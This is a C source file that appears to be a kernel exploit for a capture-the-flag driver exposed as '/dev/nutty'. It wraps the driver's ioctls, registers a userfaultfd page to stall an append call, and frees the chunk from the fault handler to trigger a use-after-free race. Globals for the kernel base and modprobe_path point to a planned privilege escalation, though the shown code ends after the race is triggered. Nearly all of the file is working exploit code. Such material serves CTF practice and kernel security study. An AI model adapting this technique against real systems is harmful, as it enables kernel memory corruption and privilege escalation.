#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <poll.h>
#include <assert.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
} while (0)

#define create 0x13371
#define delete 0x13372
#define show 0x13373
#define append 0x13374

pthread_t thread;
uint64_t race_page;
static void (*race_function)();
int target_idx;
uint64_t kbase, shmem_vm_ops, modprobe_path;
int fd;

typedef struct{
    int idx;
    int size;
    char * content;
    int content_length;
    char * show_buf;
}req;

void add(int size, char * buf){
    req r;
    r.size = size;
    r.content_length = size;
    r.content = buf;
    int ret = ioctl(fd,create,&r);
    if(ret){
        printf("Err in add");
        exit(0);
    }
    return;
}

void del(int idx){
    req r;
    r.idx = idx;
    int ret = ioctl(fd,delete,&r);
    if(ret){
        perror("Delete : ");
        exit(0);
    }
}

char * view(int idx, int size){
    req r;
    char * buf = malloc(size);
    r.idx = idx;
    r.show_buf = buf;
    int ret = ioctl(fd,show,&r);
    if(ret){
        perror("Show : ");
        exit(0);
    }
    return buf;
}

void appen(int idx, int size, char * buf){
    req r;
    r.size = size;
    r.content_length = size;
    r.content = buf;
    int ret = ioctl(fd,append,&r);
    if(ret){
        perror("Append : ");
        exit(0);
    }
    return;
}

void *racer(void *arg)
{
    struct uffd_msg uf_msg;
    struct uffdio_copy uf_copy;
    struct uffdio_range uf_range;
    long uffd = (long)arg;
    struct pollfd pollfd;
    int nready;

    pollfd.fd = uffd;
    pollfd.events = POLLIN;

    uf_range.start = race_page;
    uf_range.len = 0x1000;

    while(poll(&pollfd, 1, -1) > 0)
    {
        if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
        {
            perror("polling error");
            exit(-1);
        }
        if(read(uffd, &uf_msg, sizeof(uf_msg)) == 0)
        {
            perror("error reading event");
            exit(-1);
        }
        if(uf_msg.event != UFFD_EVENT_PAGEFAULT)
        {
            perror("unexpected result from event");
            exit(-1);
        }

        race_function();

        char uf_buffer[0x1000];
        uf_copy.src = (unsigned long)uf_buffer;
        uf_copy.dst = race_page;
        uf_copy.len = 0x1000;
        uf_copy.mode = 0;
        uf_copy.copy = 0;
        if(ioctl(uffd, UFFDIO_COPY, (unsigned long)&uf_copy) == -1)
        {
            perror("uffdio_copy error");
            exit(-1);
        }
        if (ioctl(uffd, UFFDIO_UNREGISTER, (unsigned long)&uf_range) == -1)
        {
            perror("error unregistering page for userfaultfd");
        }
        if (munmap((void *)race_page, 0x1000) == -1)
        {
            perror("error on munmapping race page");
        }
        return 0;
    }
    return 0;
}

void register_userfault()
{
    int uffd, race;
    struct uffdio_api uf_api;
    struct uffdio_register uf_register;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if(uffd == -1){
        printf("uffd failed");
        exit(0);
    }
    uf_api.api = UFFD_API;
    uf_api.features = 0;

    if (ioctl(uffd, UFFDIO_API, (unsigned long)&uf_api) == -1)
    {
        perror("error with the uffdio_api");
        exit(-1);
    }

    if (mmap((void *)race_page, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0) != (void *)race_page)
    {
        perror("whoopsie doopsie on mmap");
        exit(-1);
    }

    uf_register.range.start = race_page;
    uf_register.range.len = 0x1000;
    uf_register.mode = UFFDIO_REGISTER_MODE_MISSING;

    if (ioctl(uffd, UFFDIO_REGISTER, (unsigned long)&uf_register) == -1)
    {
        perror("error registering page for userfaultfd");
    }

    race = pthread_create(&thread, NULL, racer, (void*)(long)uffd);
    if(race != 0)
    {
        perror("can't setup threads for race");
    }
    return;
}

void double_free(){
    del(0);
    return;
}
void trigger(){
    req r;
    r.content = race_page;
    r.idx = 0;
    r.content_length = 1000;
    r.size = 1000;
    ioctl(fd,append,&r);
}

int main(){
    fd = open("/dev/nutty",O_RDWR);
    char buf[] = "aaaaaaaaaaaaaaaaaa";
    add(20,buf);
    race_page = 0xbaad0000;
    race_function = &double_free;
    target_idx = 0;
    // using classic uffd technique for race
    register_userfault();

    trigger();
    pthread_join(thread, NULL);
}
